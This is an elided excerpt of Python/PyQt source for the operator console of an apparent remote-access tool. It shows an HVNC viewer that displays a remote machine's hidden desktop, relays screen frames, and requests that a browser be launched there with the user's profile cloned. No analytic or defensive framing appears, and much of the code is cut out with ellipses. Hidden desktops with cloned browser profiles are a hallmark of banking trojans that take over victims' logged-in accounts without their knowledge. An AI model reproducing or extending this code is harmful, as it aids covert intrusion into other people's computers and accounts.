...
class HvncViewWindow(QtWidgets.QWidget):
    ...
    def __init__(
        self,
        session_id: str,
        window_type: str = "hidden",
        parent_session: "RemoteSessionDialog | None" = None,
        parent=None,
    ):
    ...
    def _setup_ui(self):
        ...
        header.setObjectName("hvncHeader")
        ...
        self.status_label.setStyleSheet("color: #0af;")
        ...
        controls.setObjectName("hvncControls")
    ...
    def update_frame(self, frame_data: str) -> None:
        """Update the displayed frame from base64 data."""
        try:
    ...
    def set_status(self, message: str, state: str = "") -> None:
        ...
        color = "#0f0" if state == "active" else "#f55" if state == "error" else "#0af"
        self.status_label.setStyleSheet(f"color: {color};")
    
    def _launch_browser(self, browser: str) -> None:
        """Request browser launch on hidden desktop."""
        if self.parent_session and self.parent_session.view:
            script = f"""
                if (window.remdesk && window.remdesk.hvnc) {{
                    window.remdesk.hvnc.sendAction('launch_browser', {{
                        browser: '{browser}',
                        clone_profile: true
                    }});
                }}
...
class DownloadBridge(QtCore.QObject):
    ...
    @QtCore.pyqtSlot(str, str)
    def openHvncWindow(self, window_type: str, session_id: str) -> None:
        """Open HVNC window from JavaScript.
        
        Args:
            window_type: Type of window ('hidden' or 'real')
            session_id: Session identifier
        """
        self._owner.open_hvnc_window(window_type, session_id)

    @QtCore.pyqtSlot(str)
    def updateHvncFrame(self, frame_data: str) -> None:
        """Update frame in all HVNC windows."""
        self._owner.send_frame_to_hvnc_windows(frame_data)
...
class RemoteSessionDialog(QtWidgets.QDialog):
    ...
    def open_hvnc_window(self, window_type: str, session_id: str) -> None:
        """Open HVNC window as a separate Qt window.
        
        This method is called from JavaScript via QWebChannel when
        the user clicks the HVNC button.
        
        Args:
            window_type: 'hidden' for hidden desktop view, 'real' for real desktop
            session_id: The current session ID
        """
        if not hasattr(self, '_hvnc_windows'):
            self._hvnc_windows = {}
        
        window_key = f"{window_type}_{session_id}"
        
        # Check if window already exists
        existing = self._hvnc_windows.get(window_key)
        ...
        hvnc_window = HvncViewWindow(
            session_id=session_id,
            window_type=window_type,
            parent_session=self,
            parent=None,  # No parent - separate window
        )
        hvnc_window.closed.connect(lambda: self._on_hvnc_window_closed(window_key))
        hvnc_window.show()
        self._hvnc_windows[window_key] = hvnc_window
        
        # Notify JS that window is open
        if self.view:
            script = f"""
                if (window.remdesk && window.remdesk.hvnc) {{
                    window.remdesk.hvnc._onWindowOpened('{window_type}', '{session_id}');
                }}
            """
            self.view.page().runJavaScript(script)

    def _on_hvnc_window_closed(self, window_key: str) -> None:
        """Handle HVNC window closed event."""
        if hasattr(self, '_hvnc_windows'):
            self._hvnc_windows.pop(window_key, None)
        
        # Notify JS
        if self.view:
            parts = window_key.split('_', 1)
            window_type = parts[0] if parts else 'unknown'
            script = f"""
                if (window.remdesk && window.remdesk.hvnc) {{
                    window.remdesk.hvnc._onWindowClosed('{window_type}');
                }}
            """
            self.view.page().runJavaScript(script)

    def send_frame_to_hvnc_windows(self, frame_data: str) -> None:
        """Send frame data to all open HVNC windows.
        
        Called from JavaScript when a new frame is received.
        """
        if not hasattr(self, '_hvnc_windows'):
            return
        for window in self._hvnc_windows.values():
            try:
                if window.isVisible():
